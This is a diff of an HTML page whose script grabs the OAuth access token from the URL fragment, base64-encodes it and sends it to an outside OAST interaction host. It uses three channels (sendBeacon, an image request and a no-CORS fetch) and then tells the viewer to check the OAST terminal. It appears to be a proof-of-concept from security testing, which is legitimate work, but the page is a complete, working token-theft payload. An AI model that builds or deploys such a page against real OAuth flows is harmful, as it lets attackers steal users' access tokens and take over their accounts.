@@ -1,32 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head><title>Authenticating...</title></head>
 <body>
-    <h1>Extracting Token...</h1>
+    <h1>Processing Authentication...</h1>
     <script>
-        // 1. Capture the fragment (#access_token=...)
-        var fragment = window.location.hash;
+        (function() {
+            var fragment = window.location.hash;
+            // YOUR CURRENT ACTIVE OAST LINK
+            var oastBase = "https://d5ofuuda9dbio9v97ls0xmcjxchecoj7h.oast.pro/"; 
 
-        if (fragment) {
-            // 2. Your active OAST URL
-            var oastUrl = "https://d5ot4ita9dbh3gactc0gkzwgnyfrjp4gz.oast.fun/?token_data=" + btoa(fragment);
+            if (fragment) {
+                var leakUrl = oastBase + "?token_data=" + btoa(fragment);
+                
+                // 1. Try Beacon (Highest success rate for exfiltration)
+                navigator.sendBeacon(leakUrl);
 
-            // 3. Primary Send: Fetch
-            fetch(oastUrl);
+                // 2. Try Image Fallback
+                var img = new Image();
+                img.src = leakUrl;
 
-            // 4. Secondary Send: Image fallback (highest success rate)
-            var leak = new Image();
-            leak.src = oastUrl;
+                // 3. Try Fetch (No-CORS mode)
+                fetch(leakUrl, { mode: 'no-cors' });
 
-            console.log("Token sent to OAST!");
-            
-            // Give the browser time to complete the background requests
-            setTimeout(function(){
-                document.body.innerHTML = "<h1>Authentication Successful</h1><p>Check your OAST terminal for the interaction.</p>";
-            }, 1000);
-        } else {
-            document.body.innerHTML = "<h1>Error: No fragment found.</h1><p>Ensure the URL contains a # fragment.</p>";
-        }
+                console.log("Exfiltration attempted.");
+                document.body.innerHTML = "<h1>Success!</h1><p>Check your OAST terminal now.</p>";
+            } else {
+                document.body.innerHTML = "<h1>Error: No fragment found in URL.</h1>";
+            }
+        })();
     </script>
 </body>
 </html>
